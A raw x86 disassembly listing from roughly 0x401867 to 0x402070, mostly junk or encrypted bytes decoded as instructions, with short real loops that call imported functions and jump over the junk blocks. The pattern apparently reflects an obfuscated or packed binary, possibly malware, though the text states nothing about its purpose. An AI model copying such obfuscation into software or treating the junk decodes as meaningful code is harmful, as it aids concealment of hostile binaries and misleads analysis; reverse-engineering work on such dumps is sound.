  401867:	jmp    0x4018b6
  401869:	inc    esp
  40186a:	jne    0x40187f
  40186c:	std    
  40186d:	adc    BYTE PTR fs:[eax-0x48],bl
  401871:	adc    al,0xa2
  401873:	popf   
  401874:	(bad)  
  401875:	cmp    al,0x8
  401877:	lods   al,BYTE PTR ds:[esi]
  401878:	fisubr WORD PTR [edi]
  40187a:	and    eax,0x5e3cdb95
  40187f:	enter  0x93f2,0xcf
  401883:	and    BYTE PTR ds:0x47a802b3,0xf5
  40188a:	int3   
  40188b:	fild   QWORD PTR [eax-0xa]
  40188e:	jl     0x4018ad
  401890:	loope  0x40188e
  401892:	mov    esi,0x46fea51
  401897:	mov    ah,0x7d
  401899:	or     bl,BYTE PTR [eax-0x4d]
  40189c:	dec    ebx
  40189d:	mov    ah,0x77
  40189f:	div    DWORD PTR [ebx-0x37926a49]
  4018a5:	imul   ecx,ebx,0xffffffa4
  4018a8:	push   ss
  4018a9:	sbb    cl,al
  4018ab:	sysret 
  4018ad:	adc    DWORD PTR [ecx-0x6a],ecx
  4018b0:	cmp    al,0x48
  4018b2:	std    
  4018b3:	mov    ecx,0x3a633120
  4018b8:	inc    edx
  4018b9:	and    al,0xa0
  4018bb:	dec    esp
  4018bc:	jmp    0x7e01f733
  4018c1:	loopne 0x4018af
  4018c3:	jbe    0x40190d
  4018c5:	stos   BYTE PTR es:[edi],al
  4018c6:	sub    al,0x64
  4018c8:	sbb    eax,0x2e300718
  4018cd:	jne    0x401919
  4018cf:	add    eax,0xd456f1aa
  4018d4:	lods   eax,DWORD PTR ds:[esi]
  4018d5:	pop    ds
  4018d6:	scas   eax,DWORD PTR es:[edi]
  4018d7:	js     0x4018df
  4018d9:	sub    BYTE PTR [ecx+0x7b],al
  4018dc:	dec    edx
  4018dd:	mov    eax,0x1bd7b099
  4018e2:	int    0x18
  4018e4:	repz pop eax
  4018e6:	cmp    edx,edx
  4018e8:	mov    ecx,0x776cfb58
  4018ed:	cwde   
  4018ee:	xchg   DWORD PTR [eax],ebp
  4018f0:	lahf   
  4018f1:	arpl   WORD PTR [ebx-0x1275f699],cx
  4018f7:	mov    bl,al
  4018f9:	repnz mov ch,0xb3
  4018fc:	pop    ss
  4018fd:	cs jp  0x4018b2
  401900:	pop    esi
  401901:	and    BYTE PTR [esi+0x54717e27],bl
  401907:	or     eax,0x9c7fd491
  40190c:	mov    dl,0xb5
  40190e:	inc    ebx
  40190f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401910:	popa   
  401911:	mov    eax,ds:0xeb2dd0a1
  401916:	aaa    
  401917:	scas   al,BYTE PTR es:[edi]
  401918:	dec    ebp
  401919:	sbb    al,0x39
  40191b:	shl    BYTE PTR [esi-0x19a5943d],0x11
  401922:	xor    eax,0xfaf73d71
  401927:	dec    esp
  401928:	push   0xffffffda
  40192a:	adc    eax,0xe06194b0
  40192f:	mov    BYTE PTR cs:[edx+0x9],ah
  401933:	mov    cl,0xd5
  401935:	shl    DWORD PTR ds:0x8c12dd37,1
  40193b:	pop    esp
  40193c:	rol    BYTE PTR [ecx-0x65261287],0x70
  401943:	mov    bh,ah
  401945:	sub    al,0x49
  401947:	stc    
  401948:	push   ebp
  401949:	inc    ebp
  40194a:	add    dh,al
  40194c:	pop    esi
  40194d:	mov    ebx,0xf347d3cc
  401952:	adc    al,0xbc
  401954:	inc    DWORD PTR [edx+0x7ce057de]
  40195a:	xchg   esi,eax
  40195b:	mov    ebp,0x3fcfaaba
  401960:	iret   
  401961:	lock push 0x53
  401964:	(bad)  
  401965:	sar    BYTE PTR [ebp+0x7e1e0aa0],1
  40196b:	cmp    bh,0x31
  40196e:	cdq    
  40196f:	sub    BYTE PTR [edi-0x23],bl
  401972:	in     eax,0x8c
  401974:	ror    BYTE PTR [ebx],0x32
  401977:	jb     0x4019dd
  401979:	adc    dh,BYTE PTR [ebp+0x57]
  40197c:	es adc al,0x4d
  40197f:	clc    
  401980:	pop    esi
  401981:	aas    
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	scas   eax,DWORD PTR es:[edi]
  4019a4:	xor    ah,ch
  4019a6:	pop    ebx
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019a5
  4019b0:	shl    DWORD PTR [eax+0x1a1512a7],0xe
  4019b7:	inc    eax
  4019b8:	mov    esi,0x7fc4e28c
  4019bd:	jg     0x4019ff
  4019bf:	xor    eax,0x886c5c6c
  4019c4:	inc    ebx
  4019c5:	test   al,0xc2
  4019c7:	xchg   ecx,eax
  4019c8:	pop    edi
  4019c9:	scas   eax,DWORD PTR es:[edi]
  4019ca:	imul   ebp,DWORD PTR [eax],0xffffffcd
  4019cd:	push   ebp
  4019ce:	push   edi
  4019cf:	mov    BYTE PTR [eax+edx*8-0xb37ae45],ch
  4019d6:	jbe    0x4019a8
  4019d8:	mov    eax,ds:0xc917706a
  4019dd:	cmp    al,0x61
  4019df:	jge    0x40199c
  4019e1:	push   ss
  4019e2:	mov    bl,0x25
  4019e4:	xor    BYTE PTR [esi+eiz*2-0x3d49da1],ch
  4019eb:	bound  edi,QWORD PTR [eax-0x7f]
  4019ee:	push   ds
  4019ef:	adc    eax,0xd789c8c7
  4019f4:	int    0x3c
  4019f6:	push   es
  4019f7:	loopne 0x401a72
  4019f9:	xor    BYTE PTR [edi],dh
  4019fb:	mov    al,ds:0xb1c006ae
  401a00:	sub    edi,ebx
  401a02:	stos   DWORD PTR es:[edi],eax
  401a03:	mov    ?,ecx
  401a05:	ins    DWORD PTR es:[edi],dx
  401a06:	mov    ?,WORD PTR [edx+0x36]
  401a09:	popf   
  401a0a:	(bad)  
  401a0b:	mov    ecx,0x203ee9e3
  401a10:	or     ecx,0x3ed29ec1
  401a16:	js     0x4019cc
  401a18:	xchg   esp,eax
  401a19:	adc    DWORD PTR [esi],eax
  401a1b:	test   BYTE PTR [ebp-0xf],0xc6
  401a1f:	adc    edx,DWORD PTR [ebp-0x60229c32]
  401a25:	or     ecx,esp
  401a27:	jmp    0xa904:0xe6747d83
  401a2e:	shl    DWORD PTR [ecx+0x397b2e95],1
  401a34:	pop    ecx
  401a35:	(bad)  
  401a37:	loope  0x401a64
  401a39:	jo     0x401a4f
  401a3b:	call   0xb02b:0xaccbbbfd
  401a42:	and    esi,DWORD PTR [eax+0x2b5d3d58]
  401a48:	push   ebx
  401a49:	mov    edx,esi
  401a4b:	pop    esi
  401a4c:	arpl   di,di
  401a4e:	mov    esi,0x6be531ec
  401a53:	mov    dh,0xe2
  401a55:	cld    
  401a56:	test   DWORD PTR [esi+eiz*4+0x12],esp
  401a5a:	mov    DWORD PTR [eax+0x44f11924],ecx
  401a60:	mov    edi,0xd12c9ba6
  401a65:	dec    esp
  401a66:	xchg   DWORD PTR [esp+ebp*4],esp
  401a69:	mov    ch,0x24
  401a6b:	lea    edx,[eax+0x7eef7c38]
  401a71:	inc    edi
  401a72:	or     DWORD PTR [ebp-0x61],ebp
  401a75:	xor    ch,dh
  401a77:	ror    BYTE PTR [eax-0x131a37b7],1
  401a7d:	pop    es
  401a7e:	or     esp,esp
  401a80:	or     al,0xf
  401a82:	mov    ch,0x36
  401a84:	imul   eax,DWORD PTR [edx+0x4a],0x67
  401a88:	mov    al,ds:0xa5417a4d
  401a8d:	or     BYTE PTR [edi],bl
  401a8f:	push   ax
  401a91:	test   DWORD PTR [edi-0x54],edi
  401a94:	(bad)  
  401a95:	out    0x89,al
  401a97:	jo     0x401a34
  401a99:	mov    bl,0x67
  401a9b:	mov    al,ds:0x981d9e68
  401aa1:	jecxz  0x401a5c
  401aa3:	push   cs
  401aa4:	shl    DWORD PTR [edx+0x25],1
  401aa7:	addr16 mov bl,0xa4
  401aaa:	(bad)  [ebp+0x3e5cf0c]
  401ab0:	jmp    0x2156aa8b
  401ab5:	sahf   
  401ab6:	cmp    bh,BYTE PTR [ebx]
  401ab8:	xchg   edx,eax
  401ab9:	and    cl,ch
  401abb:	outs   dx,DWORD PTR ds:[esi]
  401abc:	into   
  401abd:	push   eax
  401abe:	mov    edx,0xf4646dff
  401ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ac4:	ror    BYTE PTR [eax],1
  401ac6:	dec    ecx
  401ac7:	cs ds (bad) 
  401aca:	or     eax,0xfd4fb2e5
  401acf:	sub    ebp,DWORD PTR [esi+0x16fd5f6d]
  401ad5:	test   DWORD PTR [edi+edi*1-0x5bc24420],esi
  401adc:	out    0xa2,eax
  401ade:	and    ah,cl
  401ae0:	push   ebp
  401ae1:	adc    DWORD PTR [ecx+0x7ce7d6d1],ebp
  401ae7:	loop   0x401a77
  401ae9:	popa   
  401aea:	bound  esi,QWORD PTR [ebx+0x78f635e0]
  401af0:	and    DWORD PTR [ebx],eax
  401af2:	loopne 0x401ad6
  401af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401af5:	lock in eax,0xae
  401af8:	mov    DWORD PTR [eax],ebp
  401afa:	(bad)  
  401afb:	scas   eax,DWORD PTR es:[edi]
  401afc:	push   0x57f49672
  401b01:	mov    ch,0xd6
  401b03:	popa   
  401b04:	clc    
  401b05:	lock mov dh,0xb
  401b08:	mov    edx,DWORD PTR [ebx+esi*8-0xd]
  401b0c:	pop    esp
  401b0d:	pop    edx
  401b0e:	cld    
  401b0f:	xor    ch,BYTE PTR [eax+ecx*4-0x240835e4]
  401b16:	not    BYTE PTR [ebp-0x78]
  401b19:	dec    esi
  401b1a:	outs   dx,DWORD PTR ds:[esi]
  401b1b:	test   DWORD PTR ds:0x52f66be,eax
  401b21:	dec    eax
  401b22:	mov    esi,0xc3a7251
  401b27:	in     al,dx
  401b28:	cmc    
  401b29:	ret    0x1b82
  401b2c:	addr16 fwait
  401b2e:	dec    ebp
  401b2f:	ds nop
  401b31:	ins    BYTE PTR es:[edi],dx
  401b32:	dec    edx
  401b33:	dec    esi
  401b34:	fcos   
  401b36:	push   0x4
  401b38:	xor    eax,0xaa10bd0a
  401b3d:	aaa    
  401b3e:	(bad)  
  401b3f:	out    dx,al
  401b40:	mov    DWORD PTR [edi+0x4811493],esp
  401b46:	fs cli 
  401b48:	ret    
  401b49:	scas   eax,DWORD PTR es:[edi]
  401b4a:	and    DWORD PTR [esi],esi
  401b4c:	xchg   edx,eax
  401b4d:	dec    esp
  401b4e:	cmp    DWORD PTR [ecx],ebp
  401b50:	je     0x401b24
  401b52:	sar    dh,0xe8
  401b55:	popf   
  401b56:	xor    ah,cl
  401b58:	loope  0x401adc
  401b5a:	je     0x401bc4
  401b5c:	inc    ecx
  401b5d:	loope  0x401b9e
  401b5f:	pop    ds
  401b60:	retf   
  401b61:	mov    ch,0x16
  401b63:	aam    0xac
  401b65:	rcl    DWORD PTR [ebp+ecx*2+0x1c],cl
  401b69:	jmp    0x401be4
  401b6b:	xchg   ebp,eax
  401b6c:	jae    0x401bd6
  401b6e:	neg    DWORD PTR [eax-0x13dcf35b]
  401b74:	dec    ecx
  401b75:	outs   dx,BYTE PTR ds:[esi]
  401b76:	and    eax,DWORD PTR [edi-0x6b]
  401b79:	jg     0x401bb5
  401b7b:	cwde   
  401b7c:	add    DWORD PTR [edx+0x7a],ebx
  401b7f:	(bad)  
  401b80:	ficom  WORD PTR [esi+0x3cdcf628]
  401b86:	cmp    DWORD PTR [edi-0xc],ebp
  401b89:	jle    0x401b8e
  401b8b:	inc    ecx
  401b8c:	aad    0xf0
  401b8e:	xchg   ebx,eax
  401b8f:	mov    bl,0x49
  401b91:	aaa    
  401b92:	pop    ss
  401b93:	aaa    
  401b94:	sub    edx,ebx
  401b96:	xchg   esi,eax
  401b97:	scas   al,BYTE PTR es:[edi]
  401b98:	or     DWORD PTR [esi+eiz*2+0x12cbf0cc],esi
  401b9f:	std    
  401ba0:	adc    eax,DWORD PTR [ebx-0x53]
  401ba3:	mov    ds:0x818dc156,al
  401ba8:	mov    al,0x4f
  401baa:	mov    al,ds:0x2fdbfb5a
  401baf:	pop    ds
  401bb0:	es int3 
  401bb2:	jle    0x401b85
  401bb4:	sbb    bl,BYTE PTR [eax]
  401bb6:	dec    ebx
  401bb7:	inc    esp
  401bb8:	pop    edx
  401bb9:	inc    edx
  401bba:	repz fstp QWORD PTR [esp+edx*2+0x7db26e3]
  401bc2:	lea    edi,[esi-0x7]
  401bc5:	cmp    bh,bh
  401bc7:	mov    edi,0x921d570d
  401bcc:	imul   esi,DWORD PTR [edi-0x1e8cf71e],0x6ba5f4d4
  401bd6:	imul   bh
  401bd8:	adc    DWORD PTR [ebx-0x62b39d97],eax
  401bde:	sbb    BYTE PTR [ecx+0x45ca40e8],bl
  401be4:	shl    edi,cl
  401be6:	cmp    DWORD PTR [ebx-0x21],edi
  401be9:	add    BYTE PTR [ebx-0x20],cl
  401bec:	sub    BYTE PTR [ecx],dl
  401bee:	sub    al,0x20
  401bf0:	push   ss
  401bf1:	mov    edx,0xa4a1fddc
  401bf6:	pushf  
  401bf7:	jg     0x401bb8
  401bf9:	(bad)
  401bfc:	and    eax,eax
  401bfe:	cmp    edx,DWORD PTR ds:[edi-0x4080302f]
  401c05:	jp     0x401c0f
  401c07:	mov    ecx,0x165d393f
  401c0c:	jns    0x401bde
  401c0e:	lods   al,BYTE PTR ds:[esi]
  401c0f:	not    dl
  401c11:	add    bh,BYTE PTR [ecx+eax*8+0x6fa16c83]
  401c18:	mov    dl,0xa4
  401c1a:	mov    dh,0x94
  401c1c:	mov    esi,0x7f8ae8ef
  401c21:	xor    eax,0xb36aad7
  401c26:	int    0xae
  401c28:	cmp    ebx,DWORD PTR [edi]
  401c2a:	sbb    eax,0xb5fc218b
  401c2f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  401c31:	mov    DWORD PTR [ebp-0x20],eax
  401c34:	and    DWORD PTR ds:0x42aa9d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42aa9d
  401c48:	inc    eax
  401c49:	mov    ds:0x42aa9d,eax
  401c4e:	cmp    DWORD PTR ds:0x42aa9d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42aa9d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42ac8e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42aa9d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42aa9d
  401c90:	inc    eax
  401c91:	mov    ds:0x42aa9d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a9c1,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a9d5
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a9c9
  401cbe:	and    eax,DWORD PTR ds:0x42aa19
  401cc4:	mov    ds:0x42a9c9,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42aa59,0x42aa61
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a9dd,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xbfba
  401d05:	xor    DWORD PTR [ebp+ecx*8+0x0],ebp
  401d09:	push   es
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d14
  401d11:	mov    dl,0xfe
  401d13:	jns    0x401d86
  401d15:	enter  0x771,0xa5
  401d19:	xchg   ebx,eax
  401d1a:	mov    ch,BYTE PTR [edi-0x5f912922]
  401d20:	ret    
  401d21:	cmp    BYTE PTR [edx],ah
  401d23:	dec    edx
  401d24:	push   DWORD PTR [ebx+0x2e56f996]
  401d2a:	sar    DWORD PTR [ebp+0x62574b9b],1
  401d30:	icebp  
  401d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d32:	push   eax
  401d33:	dec    esi
  401d34:	push   ss
  401d35:	push   ebx
  401d36:	stc    
  401d37:	push   edx
  401d38:	das    
  401d39:	sub    eax,0xc1fb3d6d
  401d3e:	inc    esp
  401d3f:	lods   al,BYTE PTR ds:[esi]
  401d40:	imul   ebx,DWORD PTR [ebp-0x16e3d886],0x40
  401d47:	cmc    
  401d48:	jecxz  0x401d0d
  401d4a:	dec    ecx
  401d4b:	jg     0x401d6b
  401d4d:	jae    0x401db7
  401d4f:	adc    eax,0xfe0d6b34
  401d54:	out    0xe9,eax
  401d56:	xchg   esp,eax
  401d57:	pop    ss
  401d58:	and    al,0xe8
  401d5a:	inc    esi
  401d5b:	(bad)  
  401d5c:	pop    eax
  401d5d:	in     eax,0xa
  401d5f:	or     dh,BYTE PTR [eax]
  401d61:	push   cs
  401d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d64:	push   es
  401d65:	(bad)  
  401d66:	add    dh,BYTE PTR [ecx]
  401d68:	add    ecx,edi
  401d6a:	lods   al,BYTE PTR ds:[esi]
  401d6b:	call   0x2b4a:0x6334ce54
  401d72:	aad    0x58
  401d74:	fbstp  TBYTE PTR [ebx-0x55]
  401d77:	push   esi
  401d78:	sti    
  401d79:	jns    0x401d90
  401d7b:	repnz jmp 0x59d:0xb8f0e96a
  401d83:	pop    edx
  401d84:	jbe    0x401dfe
  401d86:	add    dl,BYTE PTR [edx]
  401d88:	mov    esi,0xf67e0e20
  401d8d:	pop    edx
  401d8e:	lahf   
  401d8f:	mov    cl,0xe7
  401d91:	cwde   
  401d92:	add    eax,0x74d9f86b
  401d97:	stos   BYTE PTR es:[edi],al
  401d98:	sub    al,0xfb
  401d9a:	jg     0x401d9e
  401d9c:	push   ds
  401d9d:	iret   
  401d9e:	jne    0x4d6b79b0
  401da4:	lea    edi,[ecx+0x330a4c12]
  401daa:	icebp  
  401dab:	dec    edx
  401dac:	inc    ebx
  401dad:	mov    bl,0x5f
  401daf:	xor    eax,0xeed9ae0f
  401db4:	mov    dl,BYTE PTR [ecx]
  401db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401db8:	jbe    0x401d51
  401dba:	lock sub eax,0xd470c78b
  401dc0:	jg     0x401d71
  401dc2:	inc    esp
  401dc3:	pop    ebx
  401dc4:	test   BYTE PTR [edi-0x61d8716d],bl
  401dca:	mov    al,0x38
  401dcc:	push   0xee4fa5b8
  401dd1:	int    0xd2
  401dd3:	jae    0x401d8f
  401dd5:	inc    edx
  401dd6:	ret    
  401dd7:	jb     0x401dc3
  401dd9:	mov    al,0x61
  401ddb:	(bad)  [edx]
  401ddd:	stos   DWORD PTR es:[edi],eax
  401dde:	push   eax
  401ddf:	xchg   ebp,eax
  401de0:	jmp    0x6d93:0xefb48da0
  401de7:	iret   
  401de8:	rol    DWORD PTR [ebx+ebx*2],1
  401deb:	fdivr  DWORD PTR [edi-0x7f]
  401dee:	jns    0x401e03
  401df0:	push   ebp
  401df1:	outs   dx,DWORD PTR ds:[esi]
  401df2:	(bad)  [edx-0x5cfe606]
  401df8:	xchg   edx,ecx
  401dfa:	aas    
  401dfb:	and    ch,bh
  401dfd:	mov    ?,WORD PTR [edx-0x49dceb28]
  401e03:	mov    ecx,0xbe2ff475
  401e08:	andnps xmm6,xmm0
  401e0b:	pop    ebp
  401e0c:	push   0x8
  401e0e:	in     al,0xf3
  401e10:	(bad)  
  401e11:	cmc    
  401e12:	scas   eax,DWORD PTR es:[edi]
  401e13:	ins    DWORD PTR es:[edi],dx
  401e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e15:	test   eax,0x3f033b94
  401e1a:	push   edx
  401e1b:	arpl   WORD PTR [ecx],cx
  401e1d:	les    ebp,FWORD PTR [ebp-0x24c922ee]
  401e23:	(bad)  
  401e24:	ins    BYTE PTR es:[edi],dx
  401e25:	jb     0x401e88
  401e27:	fwait
  401e28:	adc    DWORD PTR [eax+esi*2],esi
  401e2b:	xchg   ecx,eax
  401e2c:	sub    al,0xeb
  401e2e:	and    ebx,0xd1dfcd2e
  401e34:	lock xchg esi,eax
  401e36:	xchg   esp,eax
  401e37:	add    eax,0x6553a60b
  401e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e3d:	jg     0x401e3f
  401e3f:	cld    
  401e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e41:	mov    ds:0x5f018f79,al
  401e46:	dec    edx
  401e47:	das    
  401e48:	mov    WORD PTR [edx+0x527f0645],?
  401e4e:	adc    eax,0xf7083c4
  401e53:	popa   
  401e54:	sub    ah,0x0
  401e57:	test   al,0x2d
  401e59:	jecxz  0x401e98
  401e5b:	test   BYTE PTR [ecx-0x6ed01268],bh
  401e61:	and    edx,DWORD PTR [ebx-0x15]
  401e64:	jmp    0x401e7e
  401e66:	inc    edx
  401e67:	ins    BYTE PTR es:[edi],dx
  401e68:	mov    DWORD PTR [ebx+edx*2],edx
  401e6b:	in     al,0x9
  401e6d:	out    dx,eax
  401e6e:	push   esp
  401e6f:	repnz pop esp
  401e71:	push   cs
  401e72:	fdivr  st(2),st
  401e74:	mov    esi,0xdb71bafd
  401e79:	mov    cl,0x67
  401e7b:	aas    
  401e7c:	mov    dl,0x2d
  401e7e:	lods   eax,DWORD PTR ds:[esi]
  401e7f:	push   edx
  401e80:	call   0xc501744
  401e85:	adc    DWORD PTR [esi-0x23],eax
  401e88:	sar    BYTE PTR [edi+0x17c869f],cl
  401e8e:	fs pop es
  401e90:	popa   
  401e91:	fcomi  st,st(7)
  401e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e94:	pop    ds
  401e95:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401e97:	(bad)  
  401e98:	(bad)  
  401e99:	int    0x48
  401e9b:	cmp    edx,DWORD PTR [edx-0x9]
  401e9e:	push   ecx
  401e9f:	or     BYTE PTR [edi+0x6db518ba],dh
  401ea5:	scas   eax,DWORD PTR es:[edi]
  401ea6:	(bad)  
  401ea7:	xor    dl,BYTE PTR [esi]
  401ea9:	xchg   ebx,ebp
  401eab:	adc    al,BYTE PTR [edx-0x8]
  401eae:	test   DWORD PTR [ecx+0x2d],eax
  401eb1:	inc    ebx
  401eb2:	cmp    ch,ch
  401eb4:	cwde   
  401eb5:	jge    0x401ef9
  401eb7:	xor    eax,0x12e40aae
  401ebc:	inc    edx
  401ebd:	(bad)  
  401ebe:	jne    0x401e45
  401ec0:	push   ebp
  401ec1:	mov    ebp,DWORD PTR [ecx]
  401ec3:	mov    esi,0x62c8210d
  401ec8:	sbb    dl,0x68
  401ecb:	push   esi
  401ecc:	push   ecx
  401ecd:	je     0x401e6c
  401ecf:	push   edx
  401ed0:	sub    cl,BYTE PTR [edx+0x7848b631]
  401ed6:	out    dx,eax
  401ed7:	mov    esi,DWORD PTR [esi+eax*1+0x12]
  401edb:	push   edi
  401edc:	test   edi,edi
  401ede:	js     0x401f20
  401ee0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  401ee2:	stc    
  401ee3:	add    BYTE PTR [esi+ebp*4-0x44],ah
  401ee7:	ins    BYTE PTR es:[edi],dx
  401ee8:	mov    dh,0xca
  401eea:	jo     0x401ebf
  401eec:	ret    
  401eed:	sbb    BYTE PTR [esi-0x4f9f58b8],cl
  401ef3:	neg    BYTE PTR [ebx+0x12aa3408]
  401ef9:	add    dh,BYTE PTR [esi-0x7f]
  401efc:	pop    ebp
  401efd:	pop    ecx
  401efe:	and    BYTE PTR [ebx-0x71],ch
  401f01:	sbb    edi,DWORD PTR [ecx+0x3eae2fb6]
  401f07:	out    0xef,eax
  401f09:	mov    bl,bh
  401f0b:	adc    DWORD PTR ds:0xf2bdf05c,edx
  401f11:	mov    edx,esp
  401f13:	push   ebp
  401f14:	or     esp,esi
  401f16:	lea    edi,[eax+edi*1+0x65]
  401f1a:	cmc    
  401f1b:	mov    cl,0x5f
  401f1d:	sar    edx,1
  401f1f:	call   0x359b:0x80ee1b73
  401f26:	repz pop ebp
  401f28:	das    
  401f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f2a:	dec    ebx
  401f2b:	test   eax,0xb0d3a69a
  401f30:	adc    al,0x97
  401f32:	push   es
  401f33:	cmp    BYTE PTR [ebp-0x5f],bh
  401f36:	pop    DWORD PTR [edx]
  401f38:	lods   eax,DWORD PTR ds:[esi]
  401f39:	in     eax,dx
  401f3a:	cli    
  401f3b:	inc    ebx
  401f3c:	bound  edx,QWORD PTR [edi-0x2d]
  401f3f:	cmp    al,0xb2
  401f41:	jge    0x401f1b
  401f43:	or     BYTE PTR [esi],dh
  401f45:	outs   dx,DWORD PTR ds:[esi]
  401f46:	gs jl  0x401ef1
  401f49:	cmp    al,0xdd
  401f4b:	int3   
  401f4c:	mov    ah,dl
  401f4e:	add    BYTE PTR [esp+eiz*4],dh
  401f51:	out    dx,al
  401f52:	push   ss
  401f53:	ins    BYTE PTR es:[edi],dx
  401f54:	push   edi
  401f55:	add    eax,0xddc26f6
  401f5a:	pop    edi
  401f5b:	fcom   QWORD PTR [ecx+eiz*1]
  401f5e:	into   
  401f5f:	loope  0x401ef6
  401f61:	xchg   BYTE PTR [edx-0x270a8795],bh
  401f67:	mov    eax,0x1971c918
  401f6c:	mov    al,0x9d
  401f6e:	call   0x9f4a3ac2
  401f73:	rcl    BYTE PTR [edx],1
  401f75:	fcomi  st,st(1)
  401f77:	bt     DWORD PTR cs:[ecx+ebx*4+0x55],esp
  401f7d:	jecxz  0x401f42
  401f7f:	xchg   ecx,eax
  401f80:	jl     0x401f4e
  401f82:	adc    edx,ecx
  401f84:	aad    0x6
  401f86:	pushf  
  401f87:	cmp    DWORD PTR [edi],0xc87fc87b
  401f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8e:	into   
  401f8f:	adc    bl,BYTE PTR ds:0x33080315
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	cdq    
  401f99:	stos   BYTE PTR es:[edi],al
  401f9a:	inc    edx
  401f9b:	add    BYTE PTR [ebx],ah
  401f9d:	add    eax,0x42aae9
  401fa2:	mov    ds:0x42aa99,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42aa51,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a9b9,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a9b9
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a9b9,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a9b9,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a9b9,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [edx-0x31],esp
  402019:	pop    sp
  40201b:	xchg   BYTE PTR [eax+edi*2],al
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x401ff6
  402024:	outs   dx,BYTE PTR ds:[esi]
  402025:	mov    bl,0xdc
  402027:	or     esi,DWORD PTR [ebp-0x6f8924ce]
  40202d:	scas   al,BYTE PTR es:[edi]
  40202e:	out    0xa6,eax
  402030:	sar    DWORD PTR [edi-0x469649c3],0x76
  402037:	xchg   edi,eax
  402038:	xor    eax,0xab8fef19
  40203d:	lea    ebx,[ebp+0x7ad9757c]
  402043:	mov    dl,0xf5
  402045:	cli    
  402046:	jmp    0xa0e462d3
  40204b:	push   ds
  40204c:	xchg   BYTE PTR [ebx],cl
  40204e:	xchg   esp,eax
  40204f:	xor    al,0xe5
  402051:	inc    esi
  402052:	mul    ebp
  402054:	nop
  402055:	into   
  402056:	pop    esi
  402057:	cli    
  402058:	xor    eax,0x700bae79
  40205d:	scas   eax,DWORD PTR es:[edi]
  40205e:	inc    esi
  40205f:	mov    bl,0x47
  402061:	pop    ss
  402062:	cmp    al,BYTE PTR [eax+0x11]
  402065:	out    0xd4,al
  402067:	pop    ds
  402068:	push   eax
  402069:	ins    DWORD PTR es:[edi],dx
  40206a:	dec    ebp
  40206b:	mov    edx,0xc5e402a1
  402070:	inc    edx
